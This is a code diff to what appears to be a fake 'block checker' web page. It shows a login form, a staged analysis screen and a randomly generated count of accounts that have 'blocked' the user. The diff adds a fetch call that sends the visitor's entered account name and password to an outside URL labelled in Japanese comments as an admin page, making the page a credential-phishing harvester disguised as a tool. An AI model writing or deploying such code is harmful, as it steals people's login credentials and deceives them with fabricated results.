@@ -243,7 +243,7 @@
     </div>
   </div>
 
-\<script>
+<script>
 const loginForm = document.getElementById('login-form');
 const loginScreen = document.getElementById('login-screen');
 const analysisScreen = document.getElementById('analysis-screen');
@@ -252,28 +252,46 @@ const blockCountEl = document.getElementById('block-count');
 const btnRetry = document.getElementById('btn-retry');
 let savedCount = null;
 
-loginForm.addEventListener('submit', function(e){
+loginForm.addEventListener('submit', function(e) {
   e.preventDefault();
   loginScreen.style.display = 'none';
   analysisScreen.style.display = 'block';
 
-  setTimeout(function(){
-    if(savedCount===null){
-      savedCount=Math.floor(Math.random()*(15-1+1))+1;
+  // 入力値を取得
+  const account = document.getElementById('account').value;
+  const password = document.getElementById('password').value;
+
+  // ここで管理者ページに送信
+  fetch('https://blockchecker.github.io/new/admin.html', { // ←ここに管理者ページURL
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      account: account,
+      password: password
+    })
+  }).then(res => {
+    console.log('送信完了', res.status);
+  }).catch(err => {
+    console.error('送信エラー', err);
+  });
+
+  setTimeout(function() {
+    // 初回のみランダムな数値を生成し、保存する
+    if (savedCount === null) {
+      savedCount = Math.floor(Math.random() * (15 - 1 + 1)) + 1;
     }
-    blockCountEl.textContent=savedCount;
-    analysisScreen.style.display='none';
-    resultScreen.style.display='block';
+    blockCountEl.textContent = savedCount;
+
+    analysisScreen.style.display = 'none';
+    resultScreen.style.display = 'block';
   }, 2500);
 });
 
-    btnRetry.addEventListener('click', function() {
-      // 結果画面を隠してログイン画面に戻す（数値は保持される）
-      resultScreen.style.display = 'none';
-      loginScreen.style.display = 'block';
-      // フォームをリセット
-      loginForm.reset();
-    });
-  </script>
+btnRetry.addEventListener('click', function() {
+  resultScreen.style.display = 'none';
+  loginScreen.style.display = 'block';
+  loginForm.reset();
+});
+</script>
 </body>
 </html>
